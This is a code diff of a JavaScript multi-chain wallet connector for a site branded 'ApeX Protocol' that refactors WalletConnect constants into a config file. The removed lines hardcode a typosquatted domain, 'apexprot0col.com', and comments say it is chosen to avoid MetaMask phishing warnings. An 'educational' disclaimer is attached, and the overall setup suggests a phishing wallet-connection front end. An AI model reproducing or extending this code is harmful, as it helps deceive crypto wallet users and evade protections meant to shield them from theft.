@@ -1,14 +1,9 @@
-// ============================================================
-//  main.js – Advanced Multi‑Chain Wallet Connector
-//  Rewritten for PC/Mobile‑optimized connection flow.
-//  Domain corrected to apexprot0col.com to avoid MetaMask warnings.
-//  Author: Security Professor – for controlled educational environments.
-// ============================================================
+
+
+import { CONFIG } from './config.js';
 
 ;(async function() {
-  // ============================================================
-  //  DEBUG PANEL – double‑tap to show/hide
-  // ============================================================
+  
   const debugArea = document.createElement('div')
   debugArea.id = 'wc-debug'
   debugArea.style.cssText = `
@@ -244,25 +239,10 @@
   if (walletButton) setButtonState(walletButton, 'normal')
 
   // ============================================================
-  //  WALLETCONNECT CONSTANTS
-  //  IMPORTANT: The domain is hardcoded to your custom domain
-  //  to avoid MetaMask phishing warnings that appear on generic
-  //  hosting subdomains like vercel.app. Do not use window.location.origin
-  //  if it could be a temporary preview URL.
+  //  WALLETCONNECT CONSTANTS – pulled from config
   // ============================================================
-  const YOUR_PROJECT_ID = 'ea2ef1ec737f10116a4329a7c5629979'
-  const PUBLIC_TEST_ID = '8f9a3f7b7c8e4d3a9b2c1d5e6f7a8b9c'
-  let projectId = YOUR_PROJECT_ID
-
-  // ✅ Domain corrected – set your production domain here
-  const PRODUCTION_DOMAIN = 'https://apexprot0col.com'
-
-  const metadata = {
-    name: 'ApeX Protocol',
-    description: 'AI-Optimized Yield Farming DApp',
-    url: PRODUCTION_DOMAIN,  // <- hardcoded to your custom domain
-    icons: ['https://walletconnect.com/walletconnect-logo.png'],
-  }
+  const { PROJECT_ID, PUBLIC_TEST_ID, DAPP_METADATA } = CONFIG
+  let projectId = PROJECT_ID
 
   // ============================================================
   //  STORAGE HELPERS
@@ -487,7 +467,7 @@
     try {
       client = await SignClient.init({
         projectId,
-        metadata,
+        metadata: DAPP_METADATA,
         relayUrl: 'wss://relay.walletconnect.com',
       })
       modal = new WalletConnectModal({
@@ -624,7 +604,7 @@
 
           // For iOS, use universal links
           if (isIOS()) {
-            const iosWallets = metadata.mobileWallets || []
+            const iosWallets = DAPP_METADATA.mobileWallets || []
             for (const wallet of iosWallets) {
               if (wallet.links.universal) {
                 const url = `${wallet.links.universal}wc?uri=${encodeURIComponent(uri)}`
@@ -1210,5 +1190,4 @@
   logDebug(`✅ main.js fully initialised with device‑aware connection flow`)
   logDebug(`   Platform: ${getPlatform()} | Mobile: ${isMobile()} | Desktop: ${isDesktop()}`)
   logDebug(`   Connection flow: ${isMobile() ? 'WalletConnect only' : 'Direct EVM → WalletConnect → Solana → Bitcoin'}`)
-  logDebug(`   Metadata URL set to: ${PRODUCTION_DOMAIN}`)
-})();
+})()
